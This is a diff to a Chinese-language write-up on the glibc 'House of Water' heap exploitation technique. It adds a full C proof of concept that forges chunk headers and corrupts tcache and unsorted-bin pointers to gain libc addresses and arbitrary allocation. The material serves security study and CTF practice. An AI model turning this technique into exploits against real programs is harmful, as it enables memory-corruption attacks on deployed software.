@@ -141,4 +141,64 @@ all: 0x555555559e50 —▸ 0x555555559080 —▸ 0x555555559fb0 —▸ 0x7ffff7e
 同时 tps 的 0x20 和 0x30 的地方会写入 main_arena 的 libc 值，这里可以任意申请 libc 了。
 
 
-- 参考模型：https://4xura.com/pwn/house-of-water/
+完整 Poc：
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+
+int main() {
+    void *fake_size_lsb = malloc(0x3d8);
+    void *fake_size_msb = malloc(0x3e8);
+
+    free(fake_size_lsb);
+    free(fake_size_msb);
+    void *metadata = (void *)((long)(fake_size_lsb) & ~(0xfff));
+    void *x[7];
+    for (int i = 0; i < 7; i++) {
+        x[i] = malloc(0x88);
+    }
+    void *_ = 0;
+    void *unsorted_start = malloc(0x88);
+    _ = malloc(0x18); // Guard chunk
+
+    void *unsorted_middle = malloc(0x88);
+    _ = malloc(0x18); // Guard chunk
+
+    void *unsorted_end = malloc(0x88);
+    _ = malloc(0x18); // Guard chunk
+
+    _ = malloc(0xf000);		  // Padding
+    void *end_of_fake = malloc(0x18); // Metadata chunk
+    *(long *)end_of_fake = 0x10000;
+    *(long *)(end_of_fake + 8) = 0x20;
+
+
+    for (int i = 0; i < 7; ++i) {
+        free(x[i]);
+    }
+
+
+    *(long*)(unsorted_start - 0x18) = 0x31;
+    free(unsorted_start - 0x10); // Create a fake fd pointer for the fake chunk
+    *(long*)(unsorted_start - 0x8) = 0x91;
+
+    *(long*)(unsorted_end - 0x18) = 0x21; // Write 0x21 above unsorted_end
+    free(unsorted_end - 0x10); // Create a fake bk for the fake chunk
+    *(long*)(unsorted_end - 0x8) = 0x91;	// recover the original header
+
+    free(unsorted_end);
+    free(unsorted_middle);
+    free(unsorted_start);
+
+    /* VULNERABILITY */
+    *(unsigned long *)unsorted_start = (unsigned long)(metadata+0x80);
+    *(unsigned long *)(unsorted_end+0x8) = (unsigned long)(metadata+0x80);
+
+    malloc(0x288);
+    return 0;
+}
+```
+
+
+- 参考文章：https://4xura.com/pwn/house-of-water/
